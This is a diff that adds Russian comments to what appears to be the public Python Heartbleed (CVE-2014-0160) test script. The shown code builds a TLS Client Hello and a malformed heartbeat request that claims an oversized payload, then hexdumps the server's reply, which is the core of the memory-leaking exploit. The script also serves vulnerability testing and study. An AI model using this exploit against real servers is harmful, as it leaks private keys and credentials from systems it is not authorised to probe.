@@ -4,16 +4,18 @@ import socket
 import time
 import select
 from optparse import OptionParser
-
+# Парсинг опций командной строки для указания сервера и порта
 options = OptionParser(usage='%prog server [options]',
                        description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 
 
 def h2bin(x):
+    # Преобразует шестнадцатеричную строку в байты, удаляя пробелы и переносы строк
     return bytes.fromhex(x.replace(' ', '').replace('\n', ''))
 
 
+# Список поддерживаемых версий SSL и TLS
 version = []
 version.append(['SSL 3.0', '03 00'])
 version.append(['TLS 1.0', '03 01'])
@@ -22,6 +24,7 @@ version.append(['TLS 1.2', '03 03'])
 
 
 def create_hello(version):
+    # Создает пакет "Client Hello" для инициации SSL/TLS соединения
     hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
     43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
     bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
@@ -37,16 +40,18 @@ def create_hello(version):
     00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
     00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
     00 0f 00 01 01
-    ''')  # Убедитесь, что весь пакет hello полностью скопирован
+    ''')
     return hello
 
 
 def create_hb(version):
+    # Создает Heartbeat-запрос
     hb = h2bin('18 ' + version + ' 00 03 01 40 00')
     return hb
 
 
 def hexdump(s):
+    # Выводит данные в шестнадцатеричном и символьном представлении
     for b in range(0, len(s), 16):
         lin = s[b: b + 16]
         hxdat = ' '.join('%02X' % c for c in lin)
@@ -56,6 +61,7 @@ def hexdump(s):
 
 
 def recvall(s, length, timeout=5):
+    # Читает все данные из сокета до достижения указанной длины или тайм-аута
     endtime = time.time() + timeout
     rdata = bytearray()
     remain = length
@@ -74,6 +80,7 @@ def recvall(s, length, timeout=5):
 
 
 def recvmsg(s):
+    # Читает и обрабатывает сообщение из сокета
     hdr = recvall(s, 5)
     if hdr is None:
         print('Unexpected EOF receiving record header - server closed connection')
@@ -88,6 +95,7 @@ def recvmsg(s):
 
 
 def hit_hb(s, hb):
+    # Отправляет Heartbeat-запрос и анализирует ответ
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
@@ -112,6 +120,7 @@ def hit_hb(s, hb):
 
 
 def main():
+    # Обработка аргументов командной строки и тестирование каждого хоста на уязвимость Heartbleed
     opts, args = options.parse_args()
     if len(args) < 1:
         options.print_help()
